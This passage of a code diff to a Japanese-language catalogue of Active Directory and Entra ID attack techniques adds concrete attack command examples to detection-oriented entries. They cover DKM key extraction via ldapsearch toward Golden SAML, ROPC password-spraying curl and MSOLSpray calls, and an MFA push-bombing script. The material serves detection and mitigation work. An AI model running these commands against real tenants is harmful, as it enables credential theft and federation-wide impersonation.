7(ImageLoad)は新規イベントとして発火せず単独の検知シグナルにはならない(過信禁物)。実務上の代替シグナルは、web.config内のvalidationKey/decryptionKey該当行への予期しないファイルアクセス(FileEvents)、およびspinstall0.aspx等WebシェルがGETリクエスト応答としてキー文字列を返す際の異常なHTTPレスポンスサイズ/内容(WAF/リバースプロキシログ)。(5) パッチ適用後もASP.NET machineKeyが未ローテーションの場合、正規ToolPane.aspx経路を使わずに直接偽造__VIEWSTATE付きPOSTがSharePoint任意ページに到達し、Webシェル無しでコード実行が再発する(machineKey漏洩の遅延IoC)。ULSログ(SharePointトレースログ)の異常な例外・アクセス拒否パターンも補助シグナル。",
     "events": "4688(w3wp→cmd/powershell), Sysmon 1(プロセス生成), Sysmon 11(spinstall0.aspx等Webシェル/LAYOUTS配下ファイル作成、web.config改変), IIS W3SVCログ(POST /_layouts/15/ToolPane.aspx, Referer偽装), SharePoint ULSトレースログ, 4104(PSスクリプトブロック), web.config読み取り(FileEvents)。※Sysmon 7(ImageLoad)はSystem.Web.dll/Microsoft.IdentityModel.dll等が通常起動時から常時ロード済みのためmachineKey窃取ステップの検知には非推奨(単独では偽陰性/誤検知の元となるため events からは除外)",
     "mitigate": "2025年7月の緊急セキュリティ更新(SharePoint 2016/2019/Subscription Edition、KB群)を即時適用し、CVE-2026-56164等の後継パッチも継続的に追跡・適用する。パッチ適用のみでは不十分な点が本チェーンの核心: (1) ASP.NET machineKey(ValidationKey/DecryptionKey)は侵害の疑いがあれば必ずローテーションする(Microsoft公式手順のUpdate-SPMachineKeyコマンドレットを実行し、確実に反映させるため2回連続実行してからiisresetを行う、パッチ適用だけでは既存キーは変わらない)。(2) IISを再起動(iisreset)してAppDomainを再読込し、メモリ上に残るキー/シェルを一掃する。(3) AMSI統合を有効化しSharePointへの悪意あるペイロード検知を強化。(4) インターネット公開SharePoint farmはリバースプロキシ/WAFの背後に置き、/_layouts/*/ToolPane.aspx等への外部到達を最小化。(5) LAYOUTS配下・bin配下のファイル整合性監視、既知Webシェル(spinstall0.aspx等)のスキャンと駆除。(6) SharePointサーバをTier-0/Tier-1相当として扱いAD管理者資格情報のキャッシュを避け、DCへの過剰な権限委譲を見直す。(7) CISA KEVに登録された関連CVEを継続的にトラッキングし、緊急パッチ適用のSLAを定める。",
@@ -12152,6 +19757,28 @@ AD.I18N.ja.attacks = [
     "summary": "AD FSのDKM(Distributed Key Management)コンテナ(既定では概ねドメインの既定命名コンテキスト配下のCN=ADFS,CN=Microsoft,CN=Program Data付近に作成され、正確なDNはファームごとに異なる)は、配下の子contactオブジェクトのthumbnailPhoto属性にトークン署名/暗号化証明書の秘密鍵を保護する対称鍵を暗号化格納する。このコンテナのACLに権限粒度不備(CWE-1220, CVE-2026-56155)があり、本来Domain/Enterprise AdminsとAD FSサービスアカウントに限定されるべき読み取り権限が広範な認証済みプリンシパルに付与されてしまう。攻撃者はAD FSサーバ自体への足場を必要とせず、有効なドメインアカウント(低権限で可)さえあればドメイン参加済みの任意のホストからDC宛てLDAPで直接DKM鍵材料を読み取れる。取得した鍵材料からトークン署名証明書の秘密鍵を復号でき、Golden SAMLによる全連携アプリへの偽装SAMLトークン発行に直結する。ドメイン管理者権限もAD FSサーバの管理者権限も不要で、想定より広い攻撃対象範囲でGolden SAMLへの「最後の一歩」を埋める昇格プリミティブであり、パッチ提供前から実環境で悪用されCISA KEVに登録された(2026年7月提供パッチは検知の監査モードのみでACL自動是正は2026年10月まで行われない)。",
     "how": "前提は有効なドメインアカウント(低権限の一般ユーザーで可)のみであり、AD FSサーバへのログオンや足場は不要、ドメイン管理者権限もAD FSサーバのローカル管理者権限も不要である。AD FSはトークン署名/暗号化証明書の秘密鍵を、フォレスト内のDKMコンテナ(既定では概ねドメインの既定命名コンテキスト配下のCN=ADFS,CN=Microsoft,CN=Program Data付近に作成されるコンテナオブジェクトで、正確なDNはファーム構成により異なるためAD FS構成から取得するのが確実)に対称鍵で保護して格納する設計である。実際の暗号化鍵材料は、このコンテナ直下に作成される子contactオブジェクトのthumbnailPhoto属性(スキーマ属性GUID: 8d3bca50-1d7e-11d0-a081-00aa006c33ed)に格納される。DKM鍵材料への読み取りは本来AD FSサービスアカウントとDomain/Enterprise Adminsのみに限定されるべきだが、CVE-2026-56155はこのコンテナに設定されたACLの権限粒度が粗く(CWE-1220: Insufficient Granularity of Access Control)、本来スコープ外のはずの広範な認証済みプリンシパルにまで読み取り可能なAllow ACEが付与されてしまう欠陥である。重要な点として、この読み取りはAD FSサーバへのアクセスを一切必要としない。攻撃者はドメイン参加済みの任意のホスト(あるいはドメイン資格情報でDCのLDAP/LDAPS(389/636)に到達できる任意の地点)から直接バインドし、ldapsearchやGet-ADObject相当の標準クエリでコンテナ配下のcontactオブジェクトを列挙してthumbnailPhoto属性を取得するだけでよく、AD FSサーバへの追加のエクスプロイトチェーンや管理者権限への昇格は不要である(CVSS3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:Hが示す通り、この読み取り自体が実質的にAD FSサーバの完全な情報漏洩・掌握に相当する)。取得したDKM鍵材料から、AD FS構成DB(WID/SQL)に暗号化保存されているトークン署名/暗号化証明書の秘密鍵を復号する。復号した秘密鍵はGolden SAML(任意ユーザー・任意クレームの偽装SAMLアサーション発行)にそのまま利用でき、偽装トークンはオフラインで生成されるためAD FS発行ログ(イベント1200/1202)には記録が残らず、証明書のローテーションまで長期間有効なフェデレーション全体への恒久的バックドアとなる。Microsoftは2026年7月14日のPatch Tuesdayで修正パッチを公開したが、これは監査モード(AD FS管理者ログにイベント1132/1133/1134を記録する検知ロジックの追加のみ)であり、ACL自体は自動修正されない。自動是正(既定で有効)は2026年10月13日提供のenforcement更新まで行われず、それ以前に是正したい場合はレジストリ値HKLM\\SOFTWARE\\Microsoft\\ADFS\\RemediateDkmAcl(DWORD)を1に設定する必要がある(ファーム内の1台に設定すればファーム全体に反映)。Windows Server 2012/2012 R2は自動是正の対象外で、AD FSサービスアカウントへのWriteOwner/WriteDacl権限の事前付与を含む手動対応が必要。パッチ提供前から実環境での悪用が確認され、CISAはKEVへ緊急登録し連邦機関に2026-07-28までの是正を義務付けた。",
     "tools": "ldapsearch, AD Explorer(SysinternalsAdExplorer.exe), dsquery/ldp.exe, PowerView(Get-DomainObjectAcl, Get-ADObject), DKMDump(github.com/0xqn/DKMDump、DKM鍵のリモート抽出に特化した公開ツール), Mimikatz(鍵material処理系機能)。DKM鍵抽出自体は本CVE以前から知られる一般的なGolden SAML手法であり(SimuLand LabsのGoldenSAMLラボ等、公開スクリプトが存在)、専用ツールが乏しいわけではない。本CVEの新規性はAD FSサーバへのアクセスを要さず低権限ドメインアカウントのみで到達可能にするACL不備の側にあり、悪用の技術的難度は低い。",
+    "cmd": [
+      {
+        "tool": "ldapsearch",
+        "t": "低権限ドメインアカウントでDKMコンテナのcontactオブジェクトを直接照会。DC側4662がthumbnailPhoto読取の唯一の手掛かり",
+        "q": "ldapsearch -x -H ldap://dc01.corp.local -D 'corp\\lowpriv' -w 'Passw0rd!' -b 'CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=local' '(objectClass=contact)' thumbnailPhoto"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "PowerShellでの同等クエリ。ADFSサーバへのログオンを一切必要とせず任意のドメイン参加ホストから実行できる点が本CVEの核心",
+        "q": "Get-ADObject -SearchBase 'CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=local' -Filter \"objectClass -eq 'contact'\" -Properties thumbnailPhoto"
+      },
+      {
+        "tool": "PowerView",
+        "t": "DKMコンテナのACLを列挙し過剰許可を確認する偵察。単体では通常の権限監査と区別できない",
+        "q": "Get-DomainObjectAcl -SearchBase 'CN=ADFS,CN=Microsoft,CN=Program Data,DC=corp,DC=local' -ResolveGUIDs"
+      },
+      {
+        "tool": "AD Explorer",
+        "t": "GUIツールでの同一操作。コマンドラインが残らないためプロセス名自体を非標準ツールとして監視する必要がある",
+        "q": "SysinternalsAdExplorer.exe -s dc01.corp.local -u corp\\lowpriv -p Passw0rd!"
+      }
+    ],
     "detect": "DKMコンテナ(CN=ADFS,CN=Microsoft,CN=Program Data付近、配下のcontactオブジェクトのthumbnailPhoto属性、スキーマGUID 8d3bca50-1d7e-11d0-a081-00aa006c33ed)に対する4662(オブジェクトアクセス)をDC側で監視し、アクセス元アカウントがAD FSサービスアカウントまたはDA/EA以外であれば異常とする。ただし4662はDKMコンテナ/オブジェクトに監査SACL(ディレクトリサービスへのアクセスの監査カテゴリ+オブジェクト側SACL)を明示的に設定しない限り既定では発生しない点に注意し、事前にSACL設定の有無を確認する。攻撃はAD FSサーバへのアクセスを必要としないため、監視対象をAD FSサーバに限定せず、ドメイン内の任意端末からのLDAP/LDAPS(389/636)接続やldp.exe/dsquery.exe/AdExplorer.exe/PowerShellでのDKM関連クエリの実行をEDR/Sysmonでフリート全体を対象に相関する。加えて、2026年7月パッチ適用後はAD FS管理者ログのイベント1132(ACLが安全な基準と不一致=是正未了で依然脆弱)を監視し、1132が出続けている(RemediateDkmAcl未設定でOctober enforcement前)ファームをリスク優先度の最上位に置く。パッチ未適用/ACL是正未了のAD FSファームをCISA KEV/MSRC公開情報(CVE-2026-56155)と突合してリスク優先度を上げる。",
     "events": "4662(DKMコンテナ配下のcontactオブジェクト/thumbnailPhoto属性へのDirectory Serviceアクセス。要SACL設定), 4624(低権限アカウントのログオン。ただし本脆弱性の悪用にAD FSサーバへのログオンは不要な点に留意), Sysmon 1(LDAPツール実行)/3(389・636/TCPへの接続、ドメイン内の任意ホストが対象となりうる), AD FS管理者ログ イベント1132/1133/1134(ACL監査結果: 1132=非準拠で要是正, 1133=準拠, 1134=検知エラー)・1135/1136(October enforcement以降の自動是正の成功[旧SDDLを記録]/失敗), AD FS発行ログ 1200/1202(正規トークン発行。Golden SAML利用時はこれと対応しないEntra/フェデレーションサインインが手がかりとなる), Entraサインインログ(悪用後のGolden SAML相当の異常サインイン)",
     "mitigate": "2026年7月14日Patch TuesdayのCVE-2026-56155修正パッチを全AD FSサーバに適用する(CISA KEV登録済み、連邦機関是正期限2026-07-28)。ただしこのパッチは監査モードの検知ロジック追加のみでDKMコンテナのACLを自動修正しないため、パッチ適用だけでは脆弱性は解消されない。Windows Server 2016以降ではレジストリ値HKLM\\SOFTWARE\\Microsoft\\ADFS\\RemediateDkmAcl(DWORD)を1に設定し、2026年10月のenforcement提供を待たずに即時是正することを推奨する(ファーム内1台への設定でファーム全体に反映、是正前のSDDLはイベント1135に記録されロールバック可能)。Windows Server 2012/2012 R2は自動是正の対象外のため、AD FSサービスアカウントへのWriteOwner/WriteDacl権限を事前付与した上で手動是正を計画する。是正後の想定ACLはDomain Admins/Enterprise Admins/SYSTEMのフルコントロールとAD FSサービスアカウントの限定的な読み書き権限のみとし、それ以外の明示的Allow ACEを削除する。侵害の可能性がある環境ではトークン署名/暗号化証明書をローテーションし、AD FSサーバをTier 0として扱いローカルログオン権・管理者権限を最小化、DKMコンテナ/contactオブジェクトへのSACLによる監査ログ取得を有効化する。2026年10月のenforcement更新提供後もイベント1132が出ていないか継続監視し、意図せず是正が無効化されていないか確認する。",
@@ -12192,6 +19819,38 @@ AD.I18N.ja.attacks = [
     "summary": "OAuth2のROPC(Resource Owner Password Credentials)トークンエンドポイントや、Exchange ActiveSync/IMAP4/POP3等のレガシー認証(Basic認証)プロトコルへ、対話型サインイン画面を介さず直接ユーザ名とパスワードを送りつけてスプレーする手法。Microsoft自身がROPCを「MFAと非互換」と明記しており、対象のサインインに条件付きアクセス(Conditional Access)のMFA要求やper-user MFAが実際に適用された場合、ROPC/レガシー認証はAADSTS50076等のエラーで単純にブロックされ、MFAを迂回してトークンが発行されることはない。悪用可能なのは、CAポリシーの適用範囲(対象クラウドアプリ/リソース、クライアントアプリ条件の粒度、除外グループ)に穴があり、その特定のサインインにCA自体が適用されない(ConditionalAccessStatus=notApplied)ケースである。この場合、MFA評価点そのものを素通りし、正しいパスワードさえ当たれば無条件でアクセストークン/リフレッシュトークンが発行され得る。重要な注意点として、ROPCはConditional AccessのClient apps条件でいうLegacy authentication clients(Exchange ActiveSyncクライアント/その他のクライアント)には分類されず、Modern authentication clients(主にMobile apps and desktop clients)側の扱いとなるため、「レガシー認証のブロック」ポリシーだけではROPC自体は止まらない。Microsoftは2025年9月以降、Azure CLI等コマンドラインツールを含むユーザーIDに対するMFAを段階的に必須化しており(未対応の場合ROPCはAADSTS50076で失敗)、対応済みテナント/リソースではこの経路は縮小しつつあるが、CA適用範囲の設計漏れ、除外グループ、未展開のリソース/アプリ、CAライセンス非保有テナントでは依然としてMFA迂回口になり得る。",
     "how": "攻撃者はhttps://login.microsoftonline.com/{tenant}/oauth2/v2.0/token(または同等のv1.0 /common/oauth2/tokenエンドポイント)へgrant_type=password・client_id(Azure CLIやAzure PowerShellなどのMicrosoft一次パーティpublic client_idを流用することが多い)・username・password・scopeを含むPOSTを直接送信する(RFC 6749 4.3節のROPCグラント)。並行して、Basic認証が残っているレガシー認証面(Exchange ActiveSyncの/Microsoft-Server-ActiveSync、IMAP4:993、POP3:995、Authenticated SMTP)へも同じ資格情報リストをAuthorizationヘッダで直接投げる。Microsoft自身がROPCは「MFAと非互換」と明記しており、対象ユーザ/アプリ/リソースの組み合わせに条件付きアクセス(またはper-user MFA)が実際に適用されMFAが要求される場合、ROPCサインインはAADSTS50076等のエラーで単純に失敗しブロックされる(パスワードが正しくてもトークンは発行されない)。悪用可能なのは、CAポリシーの適用範囲設計に穴があり、その特定のサインインにCA自体が適用されない(ConditionalAccessStatus=notApplied)ケースである。具体的には、CAのClient apps条件はLegacy authentication clients(Exchange ActiveSyncクライアント/その他のクライアント=IMAP4・POP3・Authenticated SMTP等)とModern authentication clients(Browser/Mobile apps and desktop clients)を明確に区別しており、ROPCの/oauth2/v2.0/token直接呼び出しはBasic認証プロトコルではなく後者に分類される。このため「レガシー認証のブロック」ポリシー(Exchange ActiveSyncクライアント+その他のクライアントのみを対象)を適用していても、ROPCの直接呼び出しはそのポリシーの対象外のまま残り得る。加えて、CAポリシーが特定のクラウドアプリ/リソースのみを対象とし「All resources」を対象にしていない場合や、対象ユーザがCA除外グループに含まれる場合も同様にnotAppliedとなる。これらの隙間を突くことで、CA未適用のままMFAプロンプトなしに正しいパスワードでaccess_token/refresh_tokenが直接返却され、Microsoft Graph・Exchange Online(メールボックス)・SharePoint/OneDriveへ非対話的かつ持続的にアクセスできる。収集済みユーザリストに対し1アカウントあたり低頻度・広範なユーザへ分散送信することでロックアウト閾値未満に抑える(パスワードスプレー)。az login -u/-pやConnect-AzAccount -Credentialといった非対話CLIログインも内部的にROPCフローを使用するが、Microsoftは2025年9月以降ユーザーIDに対するAzure CLI等のMFA必須化を段階展開しており、対応済みテナントではMFA必須ユーザーに対しこれらのコマンドはAADSTS50076で失敗する。未対応テナントや、CA/MFAの適用範囲外にあるリソース・アプリ経由の直接ROPC呼び出し(curl/Invoke-RestMethod等)は引き続き有効である。",
     "tools": "MSOLSpray(v1.0エンドポイント/common/oauth2/tokenへgrant_type=password・client_id=1b730954-1685-4b74-9bfd-dac224a7b894等でROPC送信することを確認済み), o365spray, TREVORspray, AADInternals(Get-AADIntAccessToken -CredentialでROPCフォールバックを実装。MFA失敗時は対話認証にフォールバックする挙動で、専用の\"Invoke-AADIntROPCGrant\"コマンドレットは存在しない), MailSniper(レガシーEAS/IMAP), Azure CLI(az login -u/-p。2025年9月以降のMFA必須化ロールアウト対象テナント/ユーザーではAADSTS50076で失敗), Azure PowerShell(Connect-AzAccount -Credential。MFA未有効アカウントでのみ成功する旨がMicrosoft公式ドキュメントにも明記), curl/Invoke-RestMethod(直接token endpoint呼び出し)",
+    "cmd": [
+      {
+        "tool": "curl",
+        "t": "OAuth2 ROPCで直接トークンを要求。`grant_type=password`と一次パーティ`client_id`の組がEntraサインインログの主要トークン",
+        "q": "curl -X POST 'https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/token' -d 'grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&username=user@corp.onmicrosoft.com&password=Season2024!&scope=https://graph.microsoft.com/.default'"
+      },
+      {
+        "tool": "MSOLSpray",
+        "t": "v1.0エンドポイントへのROPCスプレーを自動化。CA未適用(ConditionalAccessStatus=notApplied)のサインインのみ成功しAADSTS50076を出さずに通る",
+        "q": "Invoke-MSOLSpray -UserList .\\userlist.txt -Password 'Season2024!'"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "資格情報から直接アクセストークンを取得。専用の\"Invoke-AADIntROPCGrant\"は存在せず`Get-AADIntAccessToken`の`-Credentials`引数が実体",
+        "q": "Get-AADIntAccessToken -Credentials $Cred -ClientId \"d3590ed6-52b3-4102-aeff-aad2292ab01c\" -Resource \"https://graph.microsoft.com\""
+      },
+      {
+        "tool": "Azure CLI",
+        "t": "非対話ログインが内部でROPCを使う。MFA必須テナントでは`AADSTS50076`で失敗するため成功はCA適用漏れの強いシグナル",
+        "q": "az login -u user@corp.onmicrosoft.com -p 'Season2024!'"
+      },
+      {
+        "tool": "Az PowerShell",
+        "t": "`-Credential`引数で非対話ログイン。同じくROPC経路でMFA必須ユーザは`AADSTS50076`/`50079`で拒否される",
+        "q": "Connect-AzAccount -Credential $Cred"
+      },
+      {
+        "tool": "curl",
+        "t": "Exchange ActiveSyncへBasic認証で直接POST。CAのクライアントアプリ条件でレガシー認証クライアントとして扱われない点が悪用点",
+        "q": "curl -u 'user@corp.onmicrosoft.com:Season2024!' 'https://outlook.office365.com/Microsoft-Server-ActiveSync?Cmd=OPTIONS'"
+      }
+    ],
     "detect": "Entra Sign-in logs(SigninLogs/AADNonInteractiveUserSignInLogs)でAuthenticationProtocol==\"ropc\"のレコードを抽出する。ROPC呼び出しのClientAppUsedは基本的に\"Mobile Apps and Desktop clients\"や\"Browser\"等のModern authentication clients側に分類され、Exchange ActiveSync/IMAP4/POP3等のLegacy authentication clientsカテゴリには通常現れない点に注意(両者は別系統の攻撃面であり、検知クエリも分けて相関する)。同一client_id/IPアドレスから多数UPNへの失敗の後に成功が混在するスプレーパターンを相関し、特にAuthenticationRequirement==\"singleFactorAuthentication\"かつResultType==0(成功)のROPCサインインを重点監視する(MFAなしで成功した非対話サインインを直接示す指標)。並行して、ClientAppUsedがExchange ActiveSync/IMAP4/POP3/Other clients/Authenticated SMTP等のレガシー認証カテゴリのサインインをまとめて監視し、ConditionalAccessStatusがnotApplied(CA未適用)のまま成功しているものを重点的に洗い出す。条件付きアクセスの「レガシー認証のブロック」ポリシー(Exchange ActiveSyncクライアント+その他のクライアント)はROPC自体をカバーしない点に留意し、CAの適用範囲(対象リソース・クライアントアプリ条件・除外グループ)の網羅性を定期監査する。Identity Protectionの匿名IP/不可能移動/侵害資格情報リスク検知と組み合わせて相関する。",
     "events": "Entra Sign-in logs (AuthenticationProtocol=ropc, AuthenticationRequirement=singleFactorAuthentication/multiFactorAuthentication, ClientAppUsed=Mobile Apps and Desktop clients/Browser/Exchange ActiveSync/IMAP4/POP3/Other clients/Authenticated SMTP, ConditionalAccessStatus=notApplied/success/failure), AADNonInteractiveUserSignInLogs, Identity Protectionリスク検知(匿名IPアドレス/不可能な移動/侵害された資格情報), Office 365監査ログ(MailItemsAccessed)",
     "mitigate": "条件付きアクセスの「レガシー認証のブロック」ポリシー(Client apps条件でExchange ActiveSyncクライアント+その他のクライアントを対象)を除外なしでテナント全体に強制適用し、Exchange OnlineのBasic認証・IMAP4/POP3/SMTP AUTHをテナント全体で無効化する。ただしこのポリシーはROPC(/oauth2/v2.0/tokenへのgrant_type=password直接呼び出し)自体はカバーしない(ROPCはModern authentication clients側に分類されるため)点に注意。ROPC経路を塞ぐには、全リソース(All resources)・全クライアントアプリを対象範囲としMFAまたは準拠デバイスを要求するCAポリシーを除外なく適用する。ROPCはMFA要求を満たせないため、CAが確実に適用される限りAADSTS50076でブロックされる。Entra IDの「認証フローのブロック」条件(Authentication flows)は本稿執筆時点でDevice code flowとAuthentication transferのみが対象でありROPCは含まれない点にも注意(ROPC対策として誤って頼らない)。ROPCを必要とする正当な自動化は証明書ベース認証やマネージドID、あるいはCA対象の専用サービスプリンシパル/ワークロードIDフェデレーションへ移行する。Microsoftが2025年9月以降段階展開している「Azure CLI等コマンドラインツールへのMFA必須化」の適用状況をテナントで確認し、az login -u/-pやConnect-AzAccount -Credential等の非対話ユーザーID認証を全廃してワークロードIDへ切り替える。break-glassアカウントを除く全ユーザにフィッシング耐性MFAまたはトークン保護ポリシーを適用し、CA除外グループとリソース対象範囲を定期監査してnotAppliedの発生源を継続的に潰す。",
@@ -12232,6 +19891,28 @@ AD.I18N.ja.attacks = [
     "summary": "窃取・推測済みの有効なパスワードを用いて、攻撃者が対象ユーザーへ正規のプッシュ型MFAチャレンジを短時間に連続送信し、通知の頻発に困惑・疲弊した利用者が誤って承認することでMFAを突破する、純粋に挙動ベースの攻撃。AiTMプロキシによるトークン中継、証明書偽造、新規認証方式の登録のいずれも伴わず、既存の正規プッシュ機構そのものを悪用する点が本質。ヘルプデスク/IT部門を装ったビッシングと組み合わせて成功率を高めるケースが多く、プッシュMFAを導入済みだが承認バーストの検知ルールを持たない組織の典型的な盲点となる。",
     "how": "パスワードスプレー、クレデンシャルスタッフィング、インフォスティーラーのログ購入等で入手した有効な平文パスワードを前提に、攻撃者がブラウザのサインイン画面再読み込みや自動化スクリプト(Selenium、PowerShell/curlでのOAuth認可リクエスト連打)を用いて対象アカウントへの対話型サインインを短間隔(数秒〜数十秒おき)で繰り返す。パスワード自体は正しく通過するため、Entra IDは二要素目としてMicrosoft Authenticator/Duo/Okta Verify等へプッシュ承認要求を毎回送出し、これが利用者のスマートフォンに連打される。並行してIT部門やセキュリティチームを装った電話・SMS・Teamsメッセージでビッシングを行い、「システムメンテナンスで複数回届く」「承認しないとアカウントがロックされる」等と説明して利用者の警戒心を解くケースが多い。深夜・早朝や業務外時間帯を狙って利用者の判断力が落ちているタイミングで畳みかけることもある。利用者が通知の由来を確認せず1回でも「承認」をタップした瞬間にMFAが突破され、正規のセッション/PRTがそのまま攻撃者のサインインフローに対して発行される。数値マッチング(Number Matching)が有効な環境では画面上の数字入力が必要になるため単純連打だけでは成立しにくくなるが、ビッシングで数字を口頭誘導されると突破される。成功後は通常のクラウドセッション窃取と同様にM365/Azureリソースへアクセスし、多くの場合その後の永続化として攻撃者自身のデバイスをEntra登録したり新規MFAメソッドを追加する(別手法領域)。",
     "tools": "既存流出パスワードリスト/パスワードスプレーツール, Selenium/PowerShell/curl等の自動化サインインスクリプト, VoIP/発信者番号偽装ツール(ビッシング用), Evilginx2等のAiTMツール(組み合わせ利用時), TokenTactics/AADInternals(成功後のトークン利用)",
+    "cmd": [
+      {
+        "tool": "Selenium",
+        "t": "ブラウザ自動操作でサインイン画面を反復送信しプッシュを連打。`SignInLogs`の承認/却下往復こそが本命の識別鍵",
+        "q": "python push_bomber.py --user victim@corp.onmicrosoft.com --password Passw0rd! --interval 15 --count 40"
+      },
+      {
+        "tool": "msedge.exe",
+        "t": "ヘッドレスブラウザで対話型認可エンドポイントを反復起動しプッシュを連打。検知は`SignInLogs`のstatus連発パターンが主軸",
+        "q": "msedge.exe --headless --user-data-dir=C:\\Temp\\prof \"https://login.microsoftonline.com/corp.onmicrosoft.com/oauth2/v2.0/authorize?client_id=<id>&response_type=code&prompt=login\""
+      },
+      {
+        "tool": "Az CLI",
+        "t": "az cliの対話ログインもMFA必須テナントではブラウザ経由のプッシュ要求を発生させる。実害はSignInLogs側の承認1回に集約される",
+        "q": "az login --username victim@corp.onmicrosoft.com --password 'Passw0rd!'"
+      },
+      {
+        "tool": "TokenTactics",
+        "t": "デバイスコードフィッシングとの併用亜種。プッシュ爆撃そのものではなくMFA疲弊後の代替経路として使われる",
+        "q": "Get-AzureToken -Client MSGraph"
+      }
+    ],
     "detect": "検知の中心はEntra IDサインインログにおけるMFAチャレンジの密度と結果の相関で、ホスト側テレメトリは本質的に存在しない(プッシュは利用者個人のスマートフォン上のAuthenticatorアプリで発生するため)。SigninLogsのAuthenticationDetails配下(authenticationMethod、authenticationStepResultDetail、succeeded)から、単一ユーザーに対し短時間(数分〜数十分)で複数回のプッシュ拒否/タイムアウトが発生し、その直後に承認・サインイン成功が続くパターンを抽出する。見慣れないIP/ASN/国、初見デバイス、深夜/業務時間外からのMFAチャレンジ発生、直前の利用者による正当なログイン操作と対応しないプッシュ要求の急増も強いシグナル。ヘルプデスクへの「MFA通知が大量に届く」という問い合わせや、Microsoft Authenticatorの「いいえ、私ではありません」不正報告と時系列が一致する場合も高信頼度の相関材料となる。",
     "events": "Entra Sign-in logs: AuthenticationDetails配下のauthenticationStepResultDetail(「MFA denied; user did not respond to mobile app notification」「MFA denied; user declined the authentication」等の拒否理由)、ResultType 500121(強力な認証失敗)の連続後にResultType 0(成功)が続くパターン; Entra Audit Logs: 「User reported suspicious activity」(不正報告), 「User registered security info」; Microsoft Authenticator/Duo/Okta管理コンソール側の認証イベントログ — ※対応するWindows Event IDは無く、クラウド/ID基盤側イベントのみで発火する",
     "mitigate": "数値マッチング(Number Matching)はMicrosoft Authenticatorのプッシュ通知全般で2023年以降既定有効だが、旧AD FSアダプタ/NPS拡張の未パッチ環境やレガシーMFAサーバー経由では単純Approve/Denyのまま回避され得るため、全認証経路(AD FS、NPS、combined registration含む)で確実に有効化・回避不能であることを棚卸しする。Conditional Accessでフィッシング耐性MFA(FIDO2セキュリティキー、証明書ベース認証、Windows Hello for Business)への段階的移行を進めプッシュ通知自体を廃止していく。MFAチャレンジのレート制限/スロットリングを有効化し閾値超過時にアラートとアカウント一時停止を連動させる。ヘルプデスク宛のMFAリセット/追加登録依頼には本人確認(コールバック、対面確認、既知端末からの再認証)を必須化しビッシングに備える。利用者教育で「身に覚えのない通知は拒否し即報告」を徹底し、Authenticatorの位置情報表示・アプリ名表示・「いいえ、私ではありません」報告機能の活用を周知する。",
